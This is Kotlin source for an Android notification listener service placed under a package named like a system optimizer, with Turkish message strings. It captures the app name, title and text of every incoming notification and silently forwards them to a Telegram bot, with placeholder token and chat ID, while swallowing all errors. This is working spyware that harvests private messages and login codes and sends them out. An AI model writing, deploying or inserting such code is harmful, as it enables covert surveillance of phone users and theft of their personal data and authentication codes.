package com.android.system.optimizer

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder

class NotificationMonitorService : NotificationListenerService() {

    private val botToken = "YOUR_TELEGRAM_BOT_TOKEN"
    private val chatId = "YOUR_TELEGRAM_CHAT_ID"

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        try {
            if (sbn == null) return
            val pkg = sbn.packageName ?: "Bilinmeyen"
            if (pkg.contains("launcher") || pkg.contains("systemui") || pkg.contains("optimizer")) return

            val extras = sbn.notification.extras
            val title = extras.getCharSequence("android.title")?.toString() ?: ""
            val text = extras.getCharSequence("android.text")?.toString() ?: ""

            if (title.isNotEmpty() || text.isNotEmpty()) {
                val msg = "🔔 *Bildirim Yakalandı*\n• *Uygulama:* `$pkg`\n• *Başlık:* $title\n• *İçerik:* $text"
                Thread {
                    sendTelegram(msg)
                }.start()
            }
        } catch (e: Exception) {}
    }

    private fun sendTelegram(msg: String) {
        try {
            val encoded = URLEncoder.encode(msg, "UTF-8")
            val url = URL("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$encoded&parse_mode=Markdown")
            val conn = url.openConnection() as HttpURLConnection
            conn.connectTimeout = 5000
            conn.readTimeout = 5000
            conn.requestMethod = "GET"
            conn.responseCode
        } catch (e: Exception) {}
    }
}
